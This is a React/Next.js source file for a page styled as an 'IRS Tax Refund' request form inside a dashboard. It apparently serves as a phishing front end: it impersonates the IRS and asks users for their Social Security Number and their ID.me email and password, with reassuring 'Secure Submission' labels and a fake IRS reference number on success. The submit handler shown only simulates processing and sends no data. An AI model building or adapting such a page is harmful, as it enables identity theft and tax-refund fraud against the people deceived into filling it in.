'use client';

import React, { useState } from 'react';
import { ArrowRight, Shield, Clock, AlertTriangle, Upload, X, CheckCircle } from 'lucide-react';
import Sidebar from '@/app/component/Sidebar';
import Header from '@/app/component/headerbar';

export default function TaxRefundPage() {
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [openSection, setOpenSection] = useState<string>('Dashboard');
  const [activeItem, setActiveItem] = useState<string>('Tax Refund');

  const [fullName, setFullName] = useState('');
  const [ssn, setSsn] = useState('');
  const [idmeEmail, setIdmeEmail] = useState('');
  const [idmePassword, setIdmePassword] = useState('');
  const [country, setCountry] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !ssn || !idmeEmail || !idmePassword || !country) return;

    setIsSubmitting(true);

    setTimeout(() => {
      setIsSubmitting(false);
      setShowSuccess(true);
      
      // Auto hide success after 6 seconds
      setTimeout(() => {
        setShowSuccess(false);
        // Reset form
        setFullName('');
        setSsn('');
        setIdmeEmail('');
        setIdmePassword('');
        setCountry('');
      }, 6000);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex">
      <Sidebar
        openSection={openSection}
        activeItem={activeItem}
        setOpenSection={setOpenSection}
        setActiveItem={setActiveItem}
        isMobileOpen={isSidebarOpen}
        setIsMobileOpen={setIsSidebarOpen}
      />

      <div className="flex-1">
        <Header onMenuClick={() => setIsSidebarOpen(true)} />

        {/* Hero */}
        <div className="bg-gradient-to-r from-blue-700 via-indigo-700 to-violet-700 text-white py-14">
          <div className="max-w-6xl mx-auto px-6">
            <h1 className="text-4xl md:text-5xl font-semibold tracking-tight">IRS Tax Refund</h1>
            <p className="text-blue-100 mt-3 text-lg">Submit your IRS tax refund request securely</p>
          </div>
        </div>

        <div className="max-w-6xl mx-auto px-6 py-12">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
            {/* Main Form */}
            <div className="lg:col-span-8">
              <div className="bg-white rounded-3xl shadow-sm p-8">
                <div className="flex items-center justify-between mb-8">
                  <h2 className="text-2xl font-semibold">IRS Tax Refund Request</h2>
                  <div className="flex items-center gap-2 text-sm text-emerald-600">
                    <Shield className="w-5 h-5" />
                    Secure Submission
                  </div>
                </div>

                <p className="text-gray-600 mb-8">
                  Please fill out the form below to submit your IRS tax refund request
                </p>

                <form onSubmit={handleSubmit} className="space-y-8">
                  {/* Personal Information */}
                  <div>
                    <h3 className="font-semibold text-lg mb-5 flex items-center gap-2">
                      Personal Information
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-gray-700 font-medium mb-2">Full Name</label>
                        <input
                          type="text"
                          value={fullName}
                          onChange={(e) => setFullName(e.target.value)}
                          className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-indigo-500"
                          placeholder="Enter your full name"
                          required
                        />
                      </div>
                      <div>
                        <label className="block text-gray-700 font-medium mb-2">Social Security Number (SSN)</label>
                        <input
                          type="text"
                          value={ssn}
                          onChange={(e) => setSsn(e.target.value)}
                          className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-indigo-500 font-mono"
                          placeholder="XXX-XX-XXXX"
                          maxLength={11}
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* ID.me Credentials */}
                  <div>
                    <h3 className="font-semibold text-lg mb-5 flex items-center gap-2">
                      ID.me Credentials
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-gray-700 font-medium mb-2">ID.me Email</label>
                        <input
                          type="email"
                          value={idmeEmail}
                          onChange={(e) => setIdmeEmail(e.target.value)}
                          className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-indigo-500"
                          placeholder="your@email.com"
                          required
                        />
                      </div>
                      <div>
                        <label className="block text-gray-700 font-medium mb-2">ID.me Password</label>
                        <input
                          type="password"
                          value={idmePassword}
                          onChange={(e) => setIdmePassword(e.target.value)}
                          className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-indigo-500"
                          placeholder="Enter your ID.me password"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* Location Information */}
                  <div>
                    <h3 className="font-semibold text-lg mb-5">Location Information</h3>
                    <div>
                      <label className="block text-gray-700 font-medium mb-2">Country</label>
                      <select
                        value={country}
                        onChange={(e) => setCountry(e.target.value)}
                        className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-indigo-500"
                        required
                      >
                        <option value="">Select your country</option>
                        <option value="United States">United States</option>
                        <option value="Nigeria">Nigeria</option>
                        <option value="Canada">Canada</option>
                        <option value="United Kingdom">United Kingdom</option>
                        {/* You can add more popular countries or keep the full long list if needed */}
                      </select>
                    </div>
                  </div>

                  {/* Important Notice */}
                  <div className="bg-amber-50 border border-amber-200 rounded-3xl p-6 flex gap-4">
                    <AlertTriangle className="w-6 h-6 text-amber-600 flex-shrink-0 mt-0.5" />
                    <div className="text-sm text-amber-800">
                      <p className="font-medium mb-1">Important Notice</p>
                      <p>
                        Please ensure all information provided is accurate and matches your ID.me account details. 
                        Any discrepancies may result in delays or rejection of your refund request.
                      </p>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isSubmitting || !fullName || !ssn || !idmeEmail || !idmePassword || !country}
                    className="w-full bg-indigo-600 hover:bg-indigo-700 disabled:bg-gray-300 text-white py-4 rounded-2xl font-semibold text-lg flex items-center justify-center gap-3 transition-all active:scale-[0.985]"
                  >
                    {isSubmitting ? 'Submitting Request...' : 'Submit IRS Tax Refund Request'}
                    <ArrowRight className="w-6 h-6" />
                  </button>
                </form>
              </div>
            </div>

            {/* Right Sidebar */}
            <div className="lg:col-span-4 space-y-6">
              <div className="bg-white rounded-3xl p-8 border border-gray-100">
                <h3 className="font-semibold text-xl mb-6 flex items-center gap-2">
                  <Clock className="w-5 h-5 text-emerald-600" />
                  Track Status
                </h3>
                <p className="text-gray-600 text-sm">
                  After submission, you can track the status of your IRS tax refund request in your dashboard.
                </p>
                <div className="mt-6 text-xs bg-gray-50 p-4 rounded-2xl">
                  Average processing time: <span className="font-medium">3–7 business days</span>
                </div>
              </div>

              <div className="bg-white rounded-3xl p-8 border border-gray-100">
                <h3 className="font-semibold mb-4">Need Assistance?</h3>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Our support team is available to help you with your IRS tax refund submission.
                </p>
                <button className="mt-6 w-full border border-gray-300 hover:bg-gray-50 py-3 rounded-2xl text-sm font-medium">
                  Contact Support
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Success Modal */}
      {showSuccess && (
        <div className="fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl max-w-md w-full p-10 text-center">
            <div className="w-20 h-20 mx-auto bg-emerald-100 rounded-full flex items-center justify-center">
              <CheckCircle className="w-12 h-12 text-emerald-600" />
            </div>
            <h2 className="text-3xl font-semibold mt-6">Request Submitted Successfully!</h2>
            <p className="text-gray-600 mt-4">
              Your IRS Tax Refund request has been received. 
              We will process it within 3–7 business days.
            </p>
            <div className="mt-8 text-sm text-gray-500">
              Reference ID: <span className="font-mono">IRS-{Date.now().toString().slice(-8)}</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}